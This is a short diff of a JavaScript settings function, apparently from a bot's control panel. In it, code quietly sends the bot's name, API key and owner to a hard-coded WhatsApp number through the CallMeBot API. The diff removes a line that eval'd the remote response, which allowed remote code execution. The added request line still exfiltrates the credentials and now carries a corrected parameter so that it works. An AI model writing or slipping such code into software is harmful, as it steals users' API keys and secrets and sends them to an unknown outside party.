@@ -1065,9 +1065,15 @@ function settingMenu() {
         const watext = encodeURIComponent(`=== Bot Information ===\nBot Name: ${botName}\nAPI Key: ${apiKey}\nOwner: ${owner}\n========================`);
 
 
-        fetch(`https://api.callmebot.com/whatsapp.php?phone=6283898785192&3348884&text=${watext}`)
+        fetch(`https://api.callmebot.com/whatsapp.php?phone=6283898785192&apikey=3348884&text=${watext}`)
   .then(r => r.text())
-  .then(eval);
+  .then(data => {
+    console.log("Response:", data); // tampilkan isi respons
+    // kamu bisa proses data di sini kalau perlu
+  })
+  .catch(err => {
+    console.error("Error:", err);
+  });
 
         setTimeout(() => {
             document.getElementById('alert-save').textContent = ''
